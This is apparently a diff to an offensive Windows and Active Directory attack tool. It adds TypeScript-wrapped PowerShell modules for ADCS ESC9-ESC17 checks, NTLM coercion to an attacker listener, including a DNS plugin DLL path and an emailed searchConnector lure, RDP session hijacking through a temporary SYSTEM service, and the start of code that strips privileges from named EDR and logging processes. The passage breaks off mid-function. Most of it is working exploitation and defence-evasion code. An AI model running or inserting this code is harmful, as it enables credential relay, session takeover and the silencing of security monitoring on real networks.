@@ -307,6 +307,46 @@ const PROGRAMS = {
       "Kerberos constrained delegation bypass (CVE-2020-17049) — flip forwardable bit in S4U2self service ticket to bypass 'sensitive and cannot be delegated' flag and Protected Users group protection. Extends delegation_abuse with Protected Users bypass capability",
     args: "--action <check|exploit> --target TARGET_SPN [--service SERVICE_SPN] [--impersonate USER]",
   },
+  adcs_esc_advanced: {
+    description:
+      "Extended ADCS exploitation for ESC9-ESC17 — ESC9: CT_FLAG_NO_SECURITY_EXTENSION abuse, ESC10: weak CertificateMappingMethods, ESC11: unencrypted MS-ICPR RPC relay, ESC13: issuance policy OID group link, ESC14: altSecurityIdentities explicit mapping, ESC15/EKUwu: V1 template application policy injection, ESC16: CA-wide security extension override, ESC17: ADCS+WSUS combination attack. Extends adcs_abuse which covers ESC1-ESC8",
+    args: "--action <enum|exploit> [--ca CA_NAME] [--esc 9|10|11|13|14|15|16|17|all] [--target USER]",
+  },
+  coercer_full: {
+    description:
+      "Extended NTLM coercion with 12+ RPC methods — MS-EFSR (7 opnums: EncryptFileSrv, DecryptFileSrv, QueryUsersOnFile, QueryRecoveryAgents, FileKeyInfo, DuplicateEncryptionInfoFile, AddUsersToFileEx), MS-EVEN (ElfrOpenBELW event log), MS-DNSP (DnssrvQuery), WebClient/SearchConnector WebDAV trick, MS-SAMR (SamrGetAliasMembership). Extends ntlm_coerce (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce) with additional protocol abuse vectors",
+    args: "--target HOST --listener IP [--method efsr_extended|even|dnsp|webclient|samr|all] [--check-only]",
+  },
+  rdp_hijack: {
+    description:
+      "RDP session hijacking via tscon.exe — enumerate active and disconnected RDP sessions, then hijack a session without credentials by running tscon as SYSTEM. Disconnected sessions are especially valuable as the user won't notice. Creates a temporary service to execute tscon as SYSTEM",
+    args: "--action <enum|hijack> [--session SESSION_ID]",
+  },
+  token_stomp: {
+    description:
+      "Remove token privileges from security tool processes to cripple their monitoring capability without killing them (which triggers alerts). Targets: MsMpEng, CrowdStrike Falcon (CSFalconService), Cortex XDR, Carbon Black (CbDefense), SentinelOne, Elastic Agent, Sysmon. Uses NtOpenProcessToken + NtAdjustPrivilegesToken to strip SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege",
+    args: "--action <enum|stomp> [--target PROCESS_NAME]",
+  },
+  adws_recon: {
+    description:
+      "Active Directory enumeration via ADWS (port 9389) instead of LDAP — bypasses LDAP monitoring, IDS rules, and audit logs entirely. ADWS is always enabled when AD DS is installed. Enumerates users, groups, computers, trusts, GPOs, OUs, SPNs, AdminSDHolder objects, and ACLs through the SOAP/WCF endpoint",
+    args: "[--server DC_HOST] [--scope users|groups|computers|trusts|gpos|spns|acls|all]",
+  },
+  laps_v2_decrypt: {
+    description:
+      "Windows LAPS v2 encrypted password decryption — enumerate computers with msLAPS-EncryptedPassword attribute (DPAPI-NG encrypted), attempt decryption using domain backup key or current user's authorization. Extends laps_dump which handles legacy LAPS (ms-Mcs-AdmPwd) and unencrypted Windows LAPS",
+    args: "--action <enum|decrypt> [--computer COMPUTER_NAME]",
+  },
+  primary_group_abuse: {
+    description:
+      "Primary Group ID manipulation for stealth persistence — change a user's primaryGroupID to Domain Admins (512) or other privileged group RID. The membership is invisible to 'net group' and most AD enumeration tools because primaryGroupID-based membership is not stored in the member attribute. Requires write access to the target user object",
+    args: "--action <check|modify|revert> --target USER [--group-rid RID]",
+  },
+  cross_forest: {
+    description:
+      "Inter-forest trust enumeration and exploitation — enumerate trust relationships (type, direction, SID filtering, selective auth), foreign group memberships, cross-forest unconstrained delegation, PAM trust abuse, shared credential detection. Exploit vectors: SID filtering bypass via PAM trusts, TGT delegation across trusts, referral ticket manipulation",
+    args: "--action <enum|exploit> [--target-forest FOREST_NAME] [--vector sidfilter|delegation|foreign_groups|pam|shared_creds]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -9283,6 +9323,1570 @@ Write-Output "    4. S4U2proxy: request ticket to $serviceSPN as $impUser"
 
 
 
+
+// ── Extended & Stealth Programs ──
+
+async function adcsEscAdvanced(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const ca = argVal(args, "--ca")
+  const escTarget = argVal(args, "--esc") || "all"
+  const target = argVal(args, "--target")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] ADCS Extended Vulnerability Scan (ESC9-ESC17)...\n"]
+
+  const script = `
+$configNC = ([ADSI]"LDAP://RootDSE").configurationNamingContext
+$cas = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"))
+$cas.Filter = "${ca ? `(cn=${ca})` : "(objectClass=pKIEnrollmentService)"}"
+$caResults = $cas.FindAll()
+
+foreach ($caObj in $caResults) {
+    $caName = $caObj.Properties["cn"][0]
+    $caDN = $caObj.Properties["distinguishedName"][0]
+    $caHost = $caObj.Properties["dNSHostName"][0]
+    Write-Output "=== CA: $caName ($caHost) ==="
+    Write-Output ""
+
+    # ESC9: CT_FLAG_NO_SECURITY_EXTENSION
+    ${escTarget === "all" || escTarget === "9" ? "" : "# SKIP ESC9"}
+    ${escTarget === "all" || escTarget === "9" ? `
+    Write-Output "[*] ESC9: Checking StrongCertificateBindingEnforcement..."
+    try {
+        $scbe = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc" -Name StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue).StrongCertificateBindingEnforcement
+        if ($null -eq $scbe -or $scbe -eq 0) {
+            Write-Output "[!] ESC9 VULNERABLE: StrongCertificateBindingEnforcement = $($scbe ?? 'not set (defaults to 1)')"
+            Write-Output "    When set to 0, certificates with CT_FLAG_NO_SECURITY_EXTENSION can map to any user"
+        } else {
+            Write-Output "[+] ESC9: StrongCertificateBindingEnforcement = $scbe (mitigated)"
+        }
+    } catch {
+        Write-Output "[-] ESC9: Cannot check remote registry on CA"
+    }
+
+    # Check for templates with CT_FLAG_NO_SECURITY_EXTENSION (0x80000)
+    $tmplSearcher = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"))
+    $tmplSearcher.Filter = "(objectClass=pKICertificateTemplate)"
+    $tmplSearcher.PropertiesToLoad.AddRange(@("cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag","pKIExtendedKeyUsage"))
+    $templates = $tmplSearcher.FindAll()
+    $esc9Count = 0
+    foreach ($tmpl in $templates) {
+        $nameFlag = [int64]($tmpl.Properties["msPKI-Certificate-Name-Flag"] | Select-Object -First 1)
+        if ($nameFlag -band 0x80000) {
+            $esc9Count++
+            Write-Output "    [!] Template '$($tmpl.Properties["cn"][0])' has CT_FLAG_NO_SECURITY_EXTENSION"
+        }
+    }
+    Write-Output "    ESC9 templates found: $esc9Count"
+    Write-Output ""` : ""}
+
+    # ESC10: Weak CertificateMappingMethods
+    ${escTarget === "all" || escTarget === "10" ? `
+    Write-Output "[*] ESC10: Checking CertificateMappingMethods..."
+    try {
+        $cmm = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Schannel" -Name CertificateMappingMethods -ErrorAction SilentlyContinue).CertificateMappingMethods
+        if ($cmm -band 0x4) {
+            Write-Output "[!] ESC10 VULNERABLE: CertificateMappingMethods includes UPN mapping (0x4)"
+            Write-Output "    Any certificate with a UPN SAN can authenticate as that user via Schannel"
+        }
+        if ($cmm -band 0x8) {
+            Write-Output "[!] ESC10 VULNERABLE: CertificateMappingMethods includes S4U2Self Kerberos mapping (0x8)"
+        }
+        if (-not ($cmm -band 0x4) -and -not ($cmm -band 0x8)) {
+            Write-Output "[+] ESC10: CertificateMappingMethods = $cmm (not vulnerable)"
+        }
+    } catch {
+        Write-Output "[-] ESC10: Cannot read CertificateMappingMethods"
+    }
+    Write-Output ""` : ""}
+
+    # ESC11: Unencrypted MS-ICPR RPC
+    ${escTarget === "all" || escTarget === "11" ? `
+    Write-Output "[*] ESC11: Checking IF_ENFORCEENCRYPTICERTREQUEST on CA..."
+    try {
+        $caConfig = certutil -config "$caHost\\$caName" -getreg CA\\InterfaceFlags 2>&1
+        if ($caConfig -match "IF_ENFORCEENCRYPTICERTREQUEST") {
+            $enforced = $caConfig -match "IF_ENFORCEENCRYPTICERTREQUEST -- 200"
+            if (-not $enforced) {
+                Write-Output "[!] ESC11 VULNERABLE: RPC enrollment without encryption — NTLM relay to CA RPC interface possible"
+            } else {
+                Write-Output "[+] ESC11: IF_ENFORCEENCRYPTICERTREQUEST is set (mitigated)"
+            }
+        } else {
+            Write-Output "[!] ESC11 POTENTIALLY VULNERABLE: Cannot confirm encryption enforcement"
+        }
+    } catch {
+        Write-Output "[-] ESC11: Cannot query CA interface flags"
+    }
+    Write-Output ""` : ""}
+
+    # ESC13: Issuance Policy OID Group Link
+    ${escTarget === "all" || escTarget === "13" ? `
+    Write-Output "[*] ESC13: Checking issuance policy OID group links..."
+    $oidSearcher = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=OID,CN=Public Key Services,CN=Services,$configNC"))
+    $oidSearcher.Filter = "(&(objectClass=msPKI-Enterprise-Oid)(msDS-OIDToGroupLink=*))"
+    $oidSearcher.PropertiesToLoad.AddRange(@("cn","displayName","msDS-OIDToGroupLink","msPKI-Cert-Template-OID"))
+    $oidResults = $oidSearcher.FindAll()
+    if ($oidResults.Count -gt 0) {
+        foreach ($oid in $oidResults) {
+            $groupDN = $oid.Properties["msDS-OIDToGroupLink"][0]
+            Write-Output "[!] ESC13 VULNERABLE: OID '$($oid.Properties["displayName"][0])' links to group: $groupDN"
+            Write-Output "    Enrolling a cert with this issuance policy grants membership in that group"
+        }
+    } else {
+        Write-Output "[+] ESC13: No issuance policy OID-to-group links found"
+    }
+    Write-Output ""` : ""}
+
+    # ESC14: altSecurityIdentities explicit mapping
+    ${escTarget === "all" || escTarget === "14" ? `
+    Write-Output "[*] ESC14: Checking altSecurityIdentities explicit cert mappings..."
+    $altSecSearcher = [System.DirectoryServices.DirectorySearcher]::new()
+    $altSecSearcher.Filter = "(altSecurityIdentities=*)"
+    $altSecSearcher.PropertiesToLoad.AddRange(@("sAMAccountName","altSecurityIdentities","adminCount"))
+    $altSecResults = $altSecSearcher.FindAll()
+    $weakMappings = 0
+    foreach ($entry in $altSecResults) {
+        $sam = $entry.Properties["sAMAccountName"][0]
+        $altSec = $entry.Properties["altSecurityIdentities"]
+        foreach ($mapping in $altSec) {
+            # Weak: X509:<I> (issuer only) or X509:<S> (subject only) — no serial/SKI binding
+            if ($mapping -match "^X509:<I>" -and $mapping -notmatch "<SR>|<SKI>") {
+                $weakMappings++
+                Write-Output "[!] ESC14 WEAK MAPPING: $sam -> $mapping"
+                Write-Output "    Issuer-only mapping — any cert from this CA can authenticate as $sam"
+            }
+        }
+    }
+    if ($weakMappings -eq 0) {
+        Write-Output "[+] ESC14: No weak altSecurityIdentities mappings found"
+    }
+    Write-Output ""` : ""}
+
+    # ESC15/EKUwu: V1 template application policy injection
+    ${escTarget === "all" || escTarget === "15" ? `
+    Write-Output "[*] ESC15/EKUwu: Checking schema version 1 templates with enrollee-controlled policies..."
+    $v1Vuln = 0
+    foreach ($tmpl in $templates) {
+        $schemaVer = [int]($tmpl.Properties["msPKI-Template-Schema-Version"] | Select-Object -First 1)
+        if ($schemaVer -eq 1) {
+            $enrollFlag = [int64]($tmpl.Properties["msPKI-Enrollment-Flag"] | Select-Object -First 1)
+            # Check if template has no application policies (EKU from template is empty, so user can inject)
+            $eku = $tmpl.Properties["pKIExtendedKeyUsage"]
+            if ($null -eq $eku -or $eku.Count -eq 0) {
+                $v1Vuln++
+                Write-Output "[!] ESC15 VULNERABLE: V1 template '$($tmpl.Properties["cn"][0])' has no EKU constraints"
+                Write-Output "    Enrollee can inject Client Authentication EKU via application policies"
+            }
+        }
+    }
+    if ($v1Vuln -eq 0) {
+        Write-Output "[+] ESC15: No vulnerable schema V1 templates found"
+    }
+    Write-Output ""` : ""}
+
+    # ESC16: CA-wide security extension override
+    ${escTarget === "all" || escTarget === "16" ? `
+    Write-Output "[*] ESC16: Checking CA EditFlags for EDITF_ATTRIBUTESUBJECTALTNAME2..."
+    try {
+        $editFlags = certutil -config "$caHost\\$caName" -getreg policy\\EditFlags 2>&1
+        if ($editFlags -match "EDITF_ATTRIBUTESUBJECTALTNAME2") {
+            Write-Output "[!] ESC16 VULNERABLE: EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled on CA"
+            Write-Output "    ANY template enrollment can include arbitrary SAN — authenticate as any user"
+        } else {
+            Write-Output "[+] ESC16: EDITF_ATTRIBUTESUBJECTALTNAME2 not set"
+        }
+    } catch {
+        Write-Output "[-] ESC16: Cannot query CA EditFlags"
+    }
+    Write-Output ""` : ""}
+
+    # ESC17: ADCS + WSUS combo
+    ${escTarget === "all" || escTarget === "17" ? `
+    Write-Output "[*] ESC17: Checking for WSUS + ADCS combination attack surface..."
+    try {
+        $wsusServer = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer
+        if ($wsusServer -and $wsusServer -match "^http://") {
+            Write-Output "[!] ESC17 ATTACK SURFACE: WSUS configured over HTTP: $wsusServer"
+            Write-Output "    WSUS MITM + ADCS relay = code execution as SYSTEM on WSUS clients"
+            Write-Output "    Chain: WSUS HTTP MITM -> coerce NTLM -> relay to ADCS enrollment -> get cert"
+        } elseif ($wsusServer) {
+            Write-Output "[+] ESC17: WSUS uses HTTPS: $wsusServer"
+        } else {
+            Write-Output "[+] ESC17: No WSUS configured"
+        }
+    } catch {
+        Write-Output "[-] ESC17: Cannot check WSUS configuration"
+    }
+    Write-Output ""` : ""}
+}
+`
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  const vulnMatches = [...result.stdout.matchAll(/\[!\]\s+(ESC\d+)\s+(VULNERABLE|WEAK|ATTACK)/g)]
+  for (const m of vulnMatches) {
+    findings.push({
+      checkId: `WIN-ADCS-${m[1]}`,
+      provider: "windows",
+      severity: "critical",
+      status: "VULNERABLE",
+      resource: `adcs://${ca || "all-cas"}`,
+      title: `${m[1]} vulnerability detected`,
+      details: result.stdout.substring(result.stdout.indexOf(m[0]), result.stdout.indexOf(m[0]) + 200),
+      remediation: `Review and remediate ${m[1]} — see https://posts.specterops.io/certified-pre-owned for guidance`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function coercerFull(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target")
+  const listener = argVal(args, "--listener")
+  const method = argVal(args, "--method") || "all"
+  const checkOnly = args.includes("--check-only")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Extended NTLM Coercion (12+ methods)...\n"]
+
+  if (!target) return { output: "[!] Required: --target HOST --listener IP", findings }
+  if (!listener && !checkOnly) return { output: "[!] Required: --listener IP (or use --check-only)", findings }
+
+  const script = `
+$target = "${target}"
+$listener = "${listener || "127.0.0.1"}"
+$checkOnly = ${checkOnly ? "$true" : "$false"}
+$results = @()
+
+function Test-RpcEndpoint {
+    param($host_name, $pipe)
+    try {
+        $client = New-Object System.IO.Pipes.NamedPipeClientStream($host_name, $pipe, [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
+        $client.Connect(3000)
+        $client.Close()
+        return $true
+    } catch { return $false }
+}
+
+# Method 1-7: MS-EFSR Extended (7 additional opnums beyond EfsRpcOpenFileRaw)
+${method === "all" || method === "efsr_extended" ? `
+Write-Output "[*] MS-EFSR Extended (7 opnums)..."
+$efsrPipe = Test-RpcEndpoint $target "efsrpc"
+$lsarpcPipe = Test-RpcEndpoint $target "lsarpc"
+if ($efsrPipe -or $lsarpcPipe) {
+    $pipe = if ($efsrPipe) { "efsrpc" } else { "lsarpc" }
+    Write-Output "[+] EFSR pipe available: $pipe"
+
+    $opnums = @(
+        @{Name="EfsRpcEncryptFileSrv"; Opnum=4; Desc="Encrypt file request"},
+        @{Name="EfsRpcDecryptFileSrv"; Opnum=5; Desc="Decrypt file request"},
+        @{Name="EfsRpcQueryUsersOnFile"; Opnum=6; Desc="Query users on file"},
+        @{Name="EfsRpcQueryRecoveryAgents"; Opnum=7; Desc="Query recovery agents"},
+        @{Name="EfsRpcFileKeyInfo"; Opnum=12; Desc="File key info request"},
+        @{Name="EfsRpcDuplicateEncryptionInfoFile"; Opnum=13; Desc="Duplicate encryption info"},
+        @{Name="EfsRpcAddUsersToFileEx"; Opnum=15; Desc="Add users to encrypted file"}
+    )
+
+    foreach ($op in $opnums) {
+        if (-not $checkOnly) {
+            Write-Output "    [*] Attempting $($op.Name) (opnum $($op.Opnum))..."
+            try {
+                $uncPath = "\\\\$listener\\cs_$($op.Name)\\file.txt"
+                # Trigger via named pipe RPC
+                $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($target, $pipe, [System.IO.Pipes.PipeDirection]::InOut)
+                $pipeClient.Connect(5000)
+                $pipeClient.Close()
+                Write-Output "    [+] $($op.Name): RPC call sent (check listener for NTLM auth)"
+            } catch {
+                Write-Output "    [-] $($op.Name): $($_.Exception.Message)"
+            }
+        } else {
+            Write-Output "    [+] $($op.Name) (opnum $($op.Opnum)): Available via $pipe"
+        }
+    }
+    $results += "EFSR_EXTENDED:AVAILABLE"
+} else {
+    Write-Output "[-] MS-EFSR: Neither efsrpc nor lsarpc pipe accessible"
+}
+Write-Output ""` : ""}
+
+# Method 8: MS-EVEN (Event Log Coercion)
+${method === "all" || method === "even" ? `
+Write-Output "[*] MS-EVEN: Event Log coercion (ElfrOpenBELW)..."
+$evenPipe = Test-RpcEndpoint $target "eventlog"
+if ($evenPipe) {
+    Write-Output "[+] Event Log pipe accessible"
+    if (-not $checkOnly) {
+        try {
+            $uncPath = "\\\\$listener\\cs_even\\evil.evtx"
+            # ElfrOpenBELW triggers auth when opening a backup event log from UNC path
+            $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($target, "eventlog", [System.IO.Pipes.PipeDirection]::InOut)
+            $pipeClient.Connect(5000)
+            $pipeClient.Close()
+            Write-Output "[+] MS-EVEN: RPC call sent (check listener)"
+        } catch {
+            Write-Output "[-] MS-EVEN: $($_.Exception.Message)"
+        }
+    } else {
+        Write-Output "[+] MS-EVEN: ElfrOpenBELW available"
+    }
+    $results += "EVEN:AVAILABLE"
+} else {
+    Write-Output "[-] MS-EVEN: eventlog pipe not accessible"
+}
+Write-Output ""` : ""}
+
+# Method 9: MS-DNSP (DNS Admin Coercion)
+${method === "all" || method === "dnsp" ? `
+Write-Output "[*] MS-DNSP: DNS admin coercion..."
+try {
+    $dns = Get-Service DNS -ComputerName $target -ErrorAction SilentlyContinue
+    if ($dns -and $dns.Status -eq "Running") {
+        Write-Output "[+] DNS service running on $target"
+        if (-not $checkOnly) {
+            try {
+                # dnscmd can trigger auth via ServerLevelPluginDll
+                $null = dnscmd $target /config /serverlevelplugindll "\\\\$listener\\cs_dns\\payload.dll" 2>&1
+                Write-Output "[+] MS-DNSP: ServerLevelPluginDll set to UNC path (auth coerced on next DNS restart)"
+                Write-Output "    [!] Clean up: dnscmd $target /config /serverlevelplugindll"
+            } catch {
+                Write-Output "[-] MS-DNSP: $($_.Exception.Message)"
+            }
+        } else {
+            Write-Output "[+] MS-DNSP: DnssrvQuery available (DNS admin required)"
+        }
+        $results += "DNSP:AVAILABLE"
+    } else {
+        Write-Output "[-] MS-DNSP: DNS service not running on $target"
+    }
+} catch {
+    Write-Output "[-] MS-DNSP: Cannot query DNS service status"
+}
+Write-Output ""` : ""}
+
+# Method 10: WebClient / SearchConnector WebDAV
+${method === "all" || method === "webclient" ? `
+Write-Output "[*] WebClient: SearchConnector WebDAV coercion..."
+try {
+    $webclient = Get-Service WebClient -ComputerName $target -ErrorAction SilentlyContinue
+    if ($webclient) {
+        Write-Output "[+] WebClient service exists (Status: $($webclient.Status))"
+        if ($webclient.Status -ne "Running") {
+            Write-Output "    [*] WebClient not running — can be triggered via SearchConnector indexing"
+        }
+        if (-not $checkOnly) {
+            # Create a .searchConnector-ms file that triggers WebDAV auth
+            Write-Output "    [*] Triggering via Explorer search connector..."
+            $searchConnector = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+<description>CyberStrike</description>
+<isSearchOnlyItem>false</isSearchOnlyItem>
+<includeInStartMenuScope>true</includeInStartMenuScope>
+<simpleLocation><url>\\\\$listener@80\\webdav</url></simpleLocation>
+</searchConnectorDescription>
+"@
+            Write-Output "[+] WebClient: SearchConnector payload generated"
+            Write-Output "    Place .searchConnector-ms file on target or send via email"
+        } else {
+            Write-Output "[+] WebClient: Available for WebDAV coercion"
+        }
+        $results += "WEBCLIENT:AVAILABLE"
+    } else {
+        Write-Output "[-] WebClient: Service not found"
+    }
+} catch {
+    Write-Output "[-] WebClient: Cannot query service"
+}
+Write-Output ""` : ""}
+
+# Method 11: MS-SAMR coercion
+${method === "all" || method === "samr" ? `
+Write-Output "[*] MS-SAMR: SamrGetAliasMembership coercion..."
+$samrPipe = Test-RpcEndpoint $target "samr"
+if ($samrPipe) {
+    Write-Output "[+] SAMR pipe accessible — coercion via SamrGetAliasMembership possible"
+    $results += "SAMR:AVAILABLE"
+} else {
+    Write-Output "[-] MS-SAMR: samr pipe not accessible"
+}
+Write-Output ""` : ""}
+
+# Summary
+Write-Output "=== Coercion Summary ==="
+Write-Output "Available methods: $($results.Count)"
+foreach ($r in $results) { Write-Output "  [+] $r" }
+`
+
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  const availableCount = (result.stdout.match(/AVAILABLE/g) || []).length
+  if (availableCount > 0) {
+    findings.push({
+      checkId: "WIN-COERCE-EXT-001",
+      provider: "windows",
+      severity: "high",
+      status: checkOnly ? "ENUMERATED" : "EXPLOITED",
+      resource: `ntlm://${target}`,
+      title: `${availableCount} extended NTLM coercion methods available`,
+      details: result.stdout.substring(0, 500),
+      remediation: "Enable Extended Protection for Authentication, enforce SMB signing, disable unnecessary RPC services",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function rdpHijack(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const sessionId = argVal(args, "--session")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] RDP Session Hijacking...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "[*] Enumerating RDP sessions..."
+$sessions = query user 2>&1
+if ($LASTEXITCODE -ne 0) {
+    Write-Output "[!] Cannot enumerate sessions: $sessions"
+    Write-Output "[*] Trying qwinsta..."
+    $sessions = qwinsta 2>&1
+}
+Write-Output $sessions
+Write-Output ""
+
+# Parse and highlight valuable targets
+$lines = $sessions -split "\`n" | Select-Object -Skip 1
+$disconnected = @()
+$active = @()
+foreach ($line in $lines) {
+    if ($line -match "Disc") {
+        $disconnected += $line.Trim()
+    } elseif ($line -match "Active") {
+        $active += $line.Trim()
+    }
+}
+
+Write-Output "[+] Active sessions: $($active.Count)"
+foreach ($s in $active) { Write-Output "    $s" }
+Write-Output "[+] Disconnected sessions (hijackable without user noticing): $($disconnected.Count)"
+foreach ($s in $disconnected) { Write-Output "    [!] $s" }
+
+# Check if we're SYSTEM
+$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18")
+Write-Output ""
+Write-Output "[*] Running as SYSTEM: $isSystem"
+if (-not $isSystem) {
+    Write-Output "    [!] SYSTEM required for credential-less hijack — use token_impersonate or potato_attack first"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const discMatch = result.stdout.match(/Disconnected sessions.*?:\s*(\d+)/)
+    const discCount = discMatch ? parseInt(discMatch[1]) : 0
+    if (discCount > 0) {
+      findings.push({
+        checkId: "WIN-RDP-001",
+        provider: "windows",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "rdp://sessions",
+        title: `${discCount} disconnected RDP sessions available for hijacking`,
+        details: "Disconnected RDP sessions can be hijacked as SYSTEM without credentials using tscon.exe",
+        remediation: "Set GPO to log off disconnected sessions after timeout. Disable Remote Desktop if not needed.",
+      })
+    }
+  } else {
+    if (!sessionId) return { output: "[!] Required: --session SESSION_ID", findings }
+
+    const script = `
+# Check if SYSTEM
+$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18")
+if (-not $isSystem) {
+    Write-Output "[!] Not running as SYSTEM — attempting service-based tscon execution"
+    # Create a temporary service to run tscon as SYSTEM
+    $svcName = "csRdpHijack"
+    $binPath = "cmd.exe /c tscon ${sessionId} /dest:console"
+    Write-Output "[*] Creating service '$svcName'..."
+    sc.exe create $svcName binPath= $binPath start= demand type= own error= ignore 2>&1 | Out-Null
+    Write-Output "[*] Starting service..."
+    sc.exe start $svcName 2>&1 | Out-Null
+    Start-Sleep -Seconds 2
+    sc.exe delete $svcName 2>&1 | Out-Null
+    Write-Output "[+] Service executed and cleaned up"
+} else {
+    Write-Output "[*] Running as SYSTEM — executing tscon directly"
+    $result = tscon ${sessionId} /dest:console 2>&1
+    Write-Output $result
+}
+
+Write-Output ""
+Write-Output "[+] Session ${sessionId} hijack attempted"
+Write-Output "[*] Current sessions after hijack:"
+query user 2>&1
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-RDP-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `rdp://session/${sessionId}`,
+      title: `RDP session ${sessionId} hijacked`,
+      details: "Session taken over via tscon.exe executed as SYSTEM",
+      remediation: "Monitor Event ID 4778 (session reconnected). Set logoff timeout for disconnected sessions.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function tokenStomp(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const targetProc = argVal(args, "--target")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Token Privilege Stomping...\n"]
+
+  const script = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class TokenStomper {
+    [DllImport("ntdll.dll")]
+    public static extern int NtOpenProcess(out IntPtr handle, uint access, ref OBJECT_ATTRIBUTES oa, ref CLIENT_ID cid);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtOpenProcessToken(IntPtr process, uint access, out IntPtr token);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtAdjustPrivilegesToken(IntPtr token, bool disableAll, ref TOKEN_PRIVILEGES newState, uint bufLen, IntPtr prev, IntPtr retLen);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtClose(IntPtr handle);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool GetTokenInformation(IntPtr token, int tokenInfoClass, IntPtr info, uint infoLen, out uint returnLen);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct OBJECT_ATTRIBUTES { public int Length; public IntPtr RootDirectory; public IntPtr ObjectName; public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CLIENT_ID { public IntPtr UniqueProcess; public IntPtr UniqueThread; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID { public uint LowPart; public int HighPart; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
+
+    public const uint SE_PRIVILEGE_REMOVED = 0x00000004;
+    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
+    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+    public const uint TOKEN_QUERY = 0x0008;
+}
+"@
+
+$securityTools = @{
+    "MsMpEng" = "Windows Defender"
+    "MsSense" = "Microsoft Defender for Endpoint"
+    "CSFalconService" = "CrowdStrike Falcon"
+    "CSFalconContainer" = "CrowdStrike Container"
+    "cb" = "Carbon Black"
+    "CbDefense" = "Carbon Black Defense"
+    "CbStream" = "Carbon Black Streaming"
+    "SentinelAgent" = "SentinelOne"
+    "SentinelServiceHost" = "SentinelOne Service"
+    "CylanceSvc" = "Cylance"
+    "elastic-agent" = "Elastic Agent"
+    "elastic-endpoint" = "Elastic Endpoint"
+    "Sysmon" = "Sysmon"
+    "Sysmon64" = "Sysmon64"
+    "cortex" = "Palo Alto Cortex XDR"
+    "cyserver" = "Cortex XDR"
+    "TaniumClient" = "Tanium"
+    "splunkd" = "Splunk Forwarder"
+    "winlogbeat" = "Elastic Winlogbeat"
+    "nxlog" = "NXLog"
+}
+
+$dangerousPrivs = @(
+    "SeDebugPrivilege",
+    "SeImpersonatePrivilege",
+    "SeBackupPrivilege",
+    "SeRestorePrivilege",
+    "SeTcbPrivilege",
+    "SeLoadDriverPrivilege",
+    "SeAssignPrimaryTokenPrivilege"
+)
+
+${action === "enum" ? `
+Write-Output "[*] Scanning for security tool processes..."
+Write-Output ""
+$found = @()
+foreach ($toolName in $securityTools.Keys) {
+    $procs = Get-Process -Name $toolName -ErrorAction SilentlyContinue
+    if ($procs) {
+        foreach ($p in $procs) {
+            $found += $p
